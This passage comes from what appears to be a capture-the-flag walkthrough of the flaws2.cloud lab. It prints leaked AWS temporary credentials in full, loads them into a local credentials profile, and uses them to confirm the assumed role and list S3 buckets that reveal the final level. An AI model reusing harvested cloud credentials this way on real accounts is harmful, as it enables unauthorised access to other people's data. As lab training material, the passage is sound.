"Token":"IQoJb3JpZ2luX2VjEEgaCXVzLWVhc3QtMSJGMEQCIBxeMpIsgtrE4nox5V7LitHwYD0Wn7YoDiXMVAVvfRFwAiB0ax+7l99UHaYccxYJZpdCixIbOsp53L2tNxkckbP00SrsAwjQ//////////8BEAMaDDY1MzcxMTMzMTc4OCIMkDVATce38yXghiPxKsAD9tMvaeNH04UFKR1+p7Qkt7/lIdppypnJonxbZl1QKQG43JdfyazMG1UWZp8bGdZdDOko9WrS5T7rfve/vEZzH/45u/3DNZt5nwSfHrG/sJKgqshpGf2EsaSymHuKGbbcvg5XSpOnGo+j73L7fTpcBr/7vPAy+YrZJULD64aZOrg162HLEa7I6b/yALVm5jkt9kb/1oVvNab8WI/e4CuvqIBI7LEGysZuLm8m5FkRHgF+WwhWmcfnW0YLaWKrVeFF8vGe2Pohftm5XXreghLJwjMUFoSPtdtT7PZGzRUpdUp3HqK0vQd5nZVfcme+GM07O4elZKFr4Kq5X+l0MAQBiSZr0IS5OkRupKT0zYxrhf98MrUCuq5epgL3PjxUwB1jxGtSBMEUR479WnMKVpWsyXOB84i9vLWunsepBerekgsf6TUamDX91m6xEX9HB4IN0AUGl90V7IScyPGLKJaj4yYCmrxZSwAJ96nS8FEyiY7v9i+t3UGoZPoJ+MlllYHFT8fQ/L9RGGrlif4V3zu59BXA47j0wnHHZmGDi1b2lu8/NrmmKURMqGvQkau/1oXB/bTw6ogjnZ5PHRESE8bbADCNwoWzBjqmAS3TkmGX560u0+BJYmVaA3aQ/6+f4tKOLE2uT8dDzQd5awlxq4jGjnook+7YH/tU8ECjkXzA7wNxHip5hY/8z3mHnJIMhsYMCYrC9xlbIjJD8vIeujED26A/0TpaIVdWV6G8CvFCQ6UdMieMb5OjnxtZIwWFG+kRHvAGSa1j7CMfvgCuSm+xZfUrPO3A97YbFWAUSFtaTtmmj45PcWod6KxKiHF3iGI =",
"Expiration":"2024-06-06T13:11:09Z"}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7a1d4b2e-16a6-4040-8355-eb5fd87dbf85)


```
RedCloud]─[~/Desktop]
└──╼ $nano ~/.aws/credentials
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $tail -n 4 ~/.aws/credentials
[level3]
AWS_ACCESS_KEY_ID=ASIAZQNB3KHGJRWV2W7 F
AWS_SECRET_ACCESS_KEY=Wa3QjgyZbzYwMCq7lBez+jJ2hD1inK+q/AtjVtL f
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEEgaCXVzLWVhc3QtMSJGMEQCIBxeMpIsgtrE4nox5V7LitHwYD0Wn7YoDiXMVAVvfRFwAiB0ax+7l99UHaYccxYJZpdCixIbOsp53L2tNxkckbP00SrsAwjQ//////////8BEAMaDDY1MzcxMTMzMTc4OCIMkDVATce38yXghiPxKsAD9tMvaeNH04UFKR1+p7Qkt7/lIdppypnJonxbZl1QKQG43JdfyazMG1UWZp8bGdZdDOko9WrS5T7rfve/vEZzH/45u/3DNZt5nwSfHrG/sJKgqshpGf2EsaSymHuKGbbcvg5XSpOnGo+j73L7fTpcBr/7vPAy+YrZJULD64aZOrg162HLEa7I6b/yALVm5jkt9kb/1oVvNab8WI/e4CuvqIBI7LEGysZuLm8m5FkRHgF+WwhWmcfnW0YLaWKrVeFF8vGe2Pohftm5XXreghLJwjMUFoSPtdtT7PZGzRUpdUp3HqK0vQd5nZVfcme+GM07O4elZKFr4Kq5X+l0MAQBiSZr0IS5OkRupKT0zYxrhf98MrUCuq5epgL3PjxUwB1jxGtSBMEUR479WnMKVpWsyXOB84i9vLWunsepBerekgsf6TUamDX91m6xEX9HB4IN0AUGl90V7IScyPGLKJaj4yYCmrxZSwAJ96nS8FEyiY7v9i+t3UGoZPoJ+MlllYHFT8fQ/L9RGGrlif4V3zu59BXA47j0wnHHZmGDi1b2lu8/NrmmKURMqGvQkau/1oXB/bTw6ogjnZ5PHRESE8bbADCNwoWzBjqmAS3TkmGX560u0+BJYmVaA3aQ/6+f4tKOLE2uT8dDzQd5awlxq4jGjnook+7YH/tU8ECjkXzA7wNxHip5hY/8z3mHnJIMhsYMCYrC9xlbIjJD8vIeujED26A/0TpaIVdWV6G8CvFCQ6UdMieMb5OjnxtZIwWFG+kRHvAGSa1j7CMfvgCuSm+xZfUrPO3A97YbFWAUSFtaTtmmj45PcWod6KxKiHF3iGI =
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile level3
{
    "UserId": "AROAJQMBDNUMIKLZKMF64:c53454aacff34019a681da88d44718fc",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/c53454aacff34019a681da88d44718fc"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/5fe307ac-ee5c-4f27-a205-3134bbf21668)


```
┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls --profile level3
2020-07-03 06:46:14 flaws2.cloud
2020-07-04 01:00:56 level1.flaws2.cloud
2020-07-04 01:00:59 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
2020-07-04 01:01:00 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
2020-07-08 05:08:15 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9606015d-67d9-488c-b32b-6d209e122133)

Navigate: http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/0068b58a-4a3e-445c-abaf-a3496de1f4db)

